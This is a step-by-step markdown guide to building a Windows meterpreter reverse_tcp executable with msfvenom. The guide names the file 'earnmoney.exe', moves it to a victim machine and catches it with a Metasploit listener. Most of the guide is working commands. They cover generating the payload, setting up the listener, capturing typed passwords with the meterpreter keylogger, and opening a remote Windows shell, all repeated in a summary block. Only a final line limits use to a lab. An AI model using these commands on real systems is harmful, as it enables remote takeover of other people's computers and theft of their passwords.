# Windows payload with msfvenom, transferring it using WinSCP, and using Metasploit for a reverse shell + keylogger attack.

This guide assumes you have:
✅ **Kali Linux (attacker)**
✅ **Windows machine (victim)**
✅ **Both are on same network**

---

## ✅ **Practical: Create & Run a Windows Payload**

---

## 🔹 **Step 1 — Prepare SSH on Linux**

1️⃣ Make sure **SSH** is installed and running on your Kali Linux:

```bash
sudo systemctl restart ssh.service
sudo systemctl status ssh.service
```

---

## 🔹 **Step 2 — Install & Setup WinSCP on Windows**

- Download & install **[WinSCP](https://winscp.net/eng/download.php)** on your Windows machine.

- Open **WinSCP**.

- Set:

  - **Host Name:** Kali’s IP address (example: `192.168.1.152`)
  - **Username:** `kali` (or your Linux username)
  - **Password:** your Kali password.
  - **Port Number:** `22` (SSH)

- Click **Login** → now you can **drag & drop** files between Windows and Linux.

---

## 🔹 **Step 3 — Create a Windows Payload**

On **Kali Linux**, run:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.152 LPORT=4444 -f exe > earnmoney.exe
```

✅ **Notes:**

- `LHOST` = Kali’s IP
- `LPORT` = listening port for reverse shell
- `-f exe` = output as Windows executable

---

## 🔹 **Step 4 — Transfer Payload to Windows**

- Using **WinSCP**, **drag & drop** `earnmoney.exe` from `/home/kali/` to your Windows machine (e.g., Desktop).

---

## 🔹 **Step 5 — Start Metasploit Listener**

On **Kali Linux**, run:

```bash
msfconsole
```

Inside the `msfconsole` prompt:

```bash
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.152
set LPORT 4444
exploit
```

✅ **This opens the listener to catch the reverse shell when the Windows EXE runs.**

---

## 🔹 **Step 6 — Run Payload on Windows**

On **Windows**, double-click `earnmoney.exe`.

Back on **Kali**, you should see:

```plaintext
[*] Sending stage...
[*] Meterpreter session opened
```

You now have a **meterpreter session**.

---

## 🔹 **Step 7 — Use Meterpreter Keylogger**

In **meterpreter**:

```bash
keyscan_start        # Start capturing keystrokes
```

🔑 Do something on Windows — like opening `google.com`, typing passwords.

---

## 🔹 **Step 8 — Dump Keystrokes**

Still inside **meterpreter**:

```bash
keyscan_dump > one.txt   # Dump keystrokes to one.txt
keyscan_stop             # Stop keylogger
```

✔️ Open `one.txt` — it shows captured keystrokes.

---

## 🔹 **Step 9 — Open Windows Shell**

Still inside **meterpreter**, you can get a real shell:

```bash
shell
```

You’ll now see:

```
C:\Windows\system32>
```

You have a full **Windows command prompt** from Kali!

---

## ✅ **Summary of All Commands**

```bash
# On Kali Linux:
sudo systemctl restart ssh.service
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.152 LPORT=4444 -f exe > earnmoney.exe

# Transfer earnmoney.exe to Windows using WinSCP.

# On Kali:
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.152
set LPORT 4444
exploit

# On Windows:
Double-click earnmoney.exe

# Back in meterpreter:
keyscan_start
# do something on Windows...
keyscan_dump > one.txt
keyscan_stop
shell
```

---

## 📌 **Important Tips**

✅ Always double-check **IP addresses**: `LHOST` = Kali IP
✅ Keep **firewall** rules open if needed.
✅ Run as **Administrator** if needed.
✅ For real-world practice, only use this in a **lab environment** — **never attack systems without permission!**
